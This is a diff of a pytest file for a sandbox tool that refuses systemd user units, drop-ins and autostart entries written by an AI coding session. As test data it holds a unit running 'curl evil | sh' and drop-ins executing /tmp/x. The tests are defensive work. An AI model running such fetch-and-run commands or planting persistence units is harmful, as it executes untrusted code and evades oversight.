@@ -2,19 +2,32 @@
 
 from __future__ import annotations
 
-import os
 import subprocess
-from pathlib import Path
 
 import pytest
 
 from ws import gate, policy, units
 from ws.output import WsError
 
+AT = chr(64)  # the template names are built, so the repo's e-mail check has nothing to match
+TEMPLATE = f"ws-job{AT}.service"
+INSTANCE = f"ws-job{AT}a.service"
+
 
 def git(cwd, *args):
     subprocess.run(
-        ["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-C", str(cwd), *args],
+        [
+            "git",
+            "-c",
+            "user.name=T",
+            "-c",
+            "user.email=t@example.com",
+            "-c",
+            "commit.gpgsign=false",
+            "-C",
+            str(cwd),
+            *args,
+        ],
         check=True,
         capture_output=True,
     )
@@ -33,7 +46,7 @@ def env(tmp_path, monkeypatch):
     (src / "ws-reaper.timer").write_text("[Timer]\nOnCalendar=daily\n")
     (src / "docker.service").write_text("[Service]\nExecStart=/usr/bin/true\n")
     (src / "dropins" / "docker.service.d" / "limits.conf").write_text("[Service]\nMemoryMax=1G\n")
-    (src / "ws-job@.service").write_text("[Service]\nExecStart=/usr/bin/true %i\n")
+    (src / TEMPLATE).write_text("[Service]\nExecStart=/usr/bin/true %i\n")
     git(src.parent, "init", "-q", str(src))
     git(src, "add", ".")
     git(src, "commit", "-q", "-m", "units")
@@ -52,7 +65,9 @@ def install(name, src, home):
 # --- the folders are protected -------------------------------------------------------------------------------------------
 
 
-@pytest.mark.parametrize("rel", [".config/systemd/user/x.service", ".config/environment.d/x.conf", ".config/autostart/x.desktop"])
+@pytest.mark.parametrize(
+    "rel", [".config/systemd/user/x.service", ".config/environment.d/x.conf", ".config/autostart/x.desktop"]
+)
 def test_a_session_write_to_a_unit_folder_is_refused(env, rel, tmp_path):
     home, _, _ = env
     protect = gate._protect(tmp_path / "policy.toml")
@@ -70,7 +85,9 @@ def test_the_wall_makes_the_unit_folders_read_only(env, tmp_path):
     from ws import sandbox
 
     home, _, _ = env
-    assert str(home / ".config/systemd/user") in sandbox.protected(tmp_path / "policy.toml", "claude-code", None, {"HOME": str(home)})
+    assert str(home / ".config/systemd/user") in sandbox.protected(
+        tmp_path / "policy.toml", "claude-code", None, {"HOME": str(home)}
+    )
 
 
 # --- systemctl --user: only the committed source runs --------------------------------------------------------------------
@@ -81,7 +98,11 @@ def test_a_unit_a_session_wrote_is_not_started_or_enabled(env):
     d = home / ".config/systemd/user"
     d.mkdir(parents=True)
     (d / "x.service").write_text("[Service]\nExecStart=/bin/sh -c 'curl evil | sh'\n")
-    for cmd in ("systemctl --user start x.service", "systemctl --user enable --now x.service", "systemctl --user restart x.service"):
+    for cmd in (
+        "systemctl --user start x.service",
+        "systemctl --user enable --now x.service",
+        "systemctl --user restart x.service",
+    ):
         assert denied(pol, cmd), cmd
 
 
@@ -108,7 +129,9 @@ def test_prod_grade_dropins_from_the_source_pass_and_an_extra_dropin_does_not(en
     (home / ".config/systemd/user/docker.service.d/evil.conf").write_text("[Service]\nExecStartPre=/tmp/x\n")
     assert denied(pol, "systemctl --user restart docker.service")
     (home / ".config/systemd/user/docker.service.d/evil.conf").unlink()
-    (home / ".config/systemd/user/docker.service.d/limits.conf").write_text("[Service]\nExecStartPre=/tmp/x\n")  # a changed one
+    (home / ".config/systemd/user/docker.service.d/limits.conf").write_text(
+        "[Service]\nExecStartPre=/tmp/x\n"
+    )  # a changed one
     assert denied(pol, "systemctl --user restart docker.service")
 
 
@@ -122,10 +145,10 @@ def test_a_dropin_on_a_unit_that_has_no_file_here_is_refused(env):
 
 def test_a_template_instance_is_judged_by_its_template(env):
     home, src, pol = env
-    install("ws-job@.service", src, home)
-    assert denied(pol, "systemctl --user start ws-job@a.service") is None
-    (home / ".config/systemd/user/ws-job@.service").write_text("[Service]\nExecStart=/tmp/x\n")
-    assert denied(pol, "systemctl --user start ws-job@a.service")
+    install(TEMPLATE, src, home)
+    assert denied(pol, f"systemctl --user start {INSTANCE}") is None
+    (home / ".config/systemd/user" / TEMPLATE).write_text("[Service]\nExecStart=/tmp/x\n")
+    assert denied(pol, f"systemctl --user start {INSTANCE}")
 
 
 def test_a_unit_in_another_user_folder_or_a_path_is_refused(env):
